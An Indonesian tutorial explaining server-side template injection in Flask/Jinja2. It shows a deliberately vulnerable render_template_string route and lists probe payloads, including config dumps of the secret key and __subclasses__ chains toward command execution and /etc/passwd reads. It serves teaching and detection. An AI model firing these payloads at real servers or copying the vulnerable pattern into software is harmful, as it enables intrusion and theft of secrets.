# 🔥 Server-Side Template Injection (SSTI)

## 📌 Apa itu SSTI?

**SSTI (Server-Side Template Injection)** adalah kerentanan yang terjadi ketika input dari pengguna disisipkan langsung ke dalam template engine **tanpa validasi atau filter yang tepat**, sehingga penyerang bisa menyisipkan ekspresi yang akan dijalankan di sisi server.

Template engine digunakan untuk menghasilkan HTML dari data dinamis. Contoh engine yang populer:
- Jinja2 (Python / Flask)
- Twig (PHP)
- Velocity (Java)
- ERB (Ruby)

---

## ⚠️ Contoh Sederhana

Misalnya di Flask (Python):

```python
@app.route("/hello")
def hello():
    name = request.args.get("name")
    return render_template_string("Hello " + name)
````

Jika kita akses:

```
/hello?name=Arif
```

Maka hasilnya:

```html
Hello Arif
```

Namun jika kita akses:

```
/hello?name={{7*7}}
```

Hasilnya:

```html
Hello 49
```

➡️ Ini artinya **input dari user diinterpretasi sebagai ekspresi Python di template**, dan itu berbahaya!

---

## 🧨 Potensi Bahaya SSTI

* Eksekusi kode (`os.system`, `subprocess`)
* Akses file (`open('/etc/passwd')`)
* Remote Code Execution (RCE)
* Escalation (dari SSTI ke shell)

---

## 🔍 Payload Umum Jinja2 (Flask)

```jinja2
{{7*7}}                   # Output: 49
{{request}}               # Cek object request
{{config}}                # Konfigurasi aplikasi Flask
{{config.items()}}        # Daftar config dan secret key
{{''.__class__.__mro__}}  # Cara menuju class-object Python
{{''.__class__.__mro__[1].__subclasses__()}}  # Semua class Python
```

🔎 Dari situ, kita bisa temukan:

```python
subclasses()[...](...)  # Eksekusi command pakai os.system atau subprocess
```

---

## 🔍 Tips Deteksi SSTI

* Coba input `{{7*7}}`, lihat apakah keluar `49`
* Input `{{1337+1}}`, `{{''.__class__}}`, dst
* Lihat apakah output berasal dari template engine
